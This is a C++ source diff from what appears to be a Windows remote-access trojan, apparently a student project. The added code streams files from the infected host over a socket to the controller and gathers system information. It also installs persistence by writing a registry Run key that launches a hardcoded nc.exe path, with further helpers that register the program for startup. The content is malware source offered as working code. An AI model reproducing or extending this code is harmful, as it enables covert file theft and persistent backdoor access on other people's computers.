@@ -48,6 +48,63 @@ bool Transfer::uploadToClient(Client* client, std::string filename)
 			return 0;
 		}
 }
+bool Transfer::downloadFromClient(Client* client,const std::string filename)
+{
+	std::cout << "Downloading .." << std::endl;
+	client->send_b(("Downloading " + filename).c_str());
+
+	std::ifstream file(filename, std::ios::binary | std::ios::in);
+
+	if (file)
+	{
+		const int len = 1024;
+		client->send_b(("download " + filename).c_str());
+		char buffer[BUFFER_LEN] = { 0 };
+
+		const unsigned int size = getSize(filename);
+
+		send(*client->getSock(), std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
+
+		std::cout << "Size : " << size << " bytes" << std::endl;
+
+		std::cout << "Sending data ..." << std::endl;
+		std::cout << size << " bytes to send" << std::endl;
+
+		int current_size = 0;
+		char memblock[len] = { 0 };
+		const int rest = size % len;
+		Sleep(2000);
+		int nb = 0;
+		file.seekg(0, std::ios::beg);
+		bool done = 0;
+		int pourcentage = 0;
+
+		while (current_size != size)
+		{
+			if (current_size + rest == size)
+			{
+				file.read(memblock, rest);
+				send(*client->getSock(), memblock, rest, 0);
+				break;
+			}
+			else
+			{
+				file.read(memblock, len);
+				send(*client->getSock(), memblock, len, 0);
+				current_size += len;
+				file.seekg(current_size, std::ios::beg);
+			}
+			
+		}
+		return 1;
+	}
+	else
+	{
+		client->send_b(("Error the file : " + filename + " doesn't exist").c_str());
+		client->send_b("Maybe you gave a wrong path");
+		return 0;
+	}
+}
 
 void Transfer::screenshot(Client* client)
 {
@@ -170,6 +227,8 @@ void Transfer::getTemp(Client* client)
 
 void InfoClient::getsysinfo(Client* client)
 {
+	client->send_b("Getting system info ...");
+	/*
 	std::string buffer;
 	std::string user = getenv("USERNAME");
 	std::string userhome = getenv("HOMEPATH");
@@ -181,16 +240,138 @@ void InfoClient::getsysinfo(Client* client)
 	std::string computername = getenv("COMPUTERNAME");
 	std::string proco = getenv("PROCESSOR_IDENTIFIER");
 
-	buffer = "\nCurrent user :\t\t" + user + "\nUser directory :\t\t" + userhome + "\nWindows directory :\t\t" + windir + "\nLocal Appdata :\t\t" + localappdate;
-	buffer += "\nSystem drive :\t\t" + systemdrive + "\nOS :\t\t" + OS + "\nComputer name :\t\t" + computername + "\nProcessor identifier :\t\t" + proco;
+	buffer = "\nCurrent user\t\t: " + user + "\nUser directory\t\t: " + userhome + "\nWindows directory\t: " + windir + "\nLocal Appdata\t\t: " + localappdate;
+	buffer += "\nSystem drive\t\t: " + systemdrive + "\nOS\t\t\t: " + OS + "\nComputer name\t\t: " + computername + "\nProcessor identifier\t: " + proco;
 	client->send_b(buffer.c_str());
-	
+	*/
+
+	/*
 	std::string ret = Shell::return_command("systeminfo");
+	
 	std::cout << ret << std::endl;
-	if (ret != "")
-	{
-		send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
-		send(*client->getSock(), ret.c_str(), HUGE, 0);
-	}
+	Sleep(4000);
+	send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
+	send(*client->getSock(), ret.c_str(), HUGE, 0);
+	send(*client->getSock(), "Done", 5, 0);
+	//  gci env:* | sort-object name
+	*/
 
 }
+
+void persistence(Client* client, const std::string filename, const wchar_t* keyname)
+{
+	client->send_b(("Putting persistence on : " + filename).c_str());
+	 
+	std::string path = Shell::return_command("chdir");
+	path += "\\" + filename;
+	client->send_b(("Path : " + path).c_str());
+
+	;
+	
+	TCHAR *Tpath= new TCHAR[path.size() + 1];
+	Tpath[path.size()] = 0;
+	
+	HKEY newValue;
+
+	LONG lResult = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
+	BOOL fsuccess = (lResult == 0);
+	TCHAR ppath[256] = L"D:\\ESIREM\\C++\\LPC\\LPC\\x64\\Debug\\nc.exe";
+	if (fsuccess)
+	{
+		RegSetValueEx(newValue, (LPWSTR)keyname, 0, REG_SZ, (LPBYTE)ppath, sizeof(ppath));
+		RegCloseKey(newValue);
+	}
+	
+	client->send_b("Done");
+}
+
+BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwRegType = REG_SZ;
+	wchar_t szPathToExe[MAX_PATH] = {};
+	DWORD dwSize = sizeof(szPathToExe);
+
+	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (fSuccess)
+	{
+		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args != NULL)
+	{
+		// caller should make sure "args" is quoted if any single argument has a space
+		// e.g. (L"-name \"Mark Voidale\"");
+		wcscat_s(szValue, count, args);
+	}
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		dwSize = (wcslen(szValue) + 1) * 2;
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+void RegisterProgram()
+{
+	wchar_t szPathToExe[MAX_PATH];
+
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
+}
+/*
+int _tmain(int argc, _TCHAR* argv[])
+{
+	RegisterProgram();
+	IsMyProgramRegisteredForStartup(L"My_Program");
+	return 0;
+}
+*/
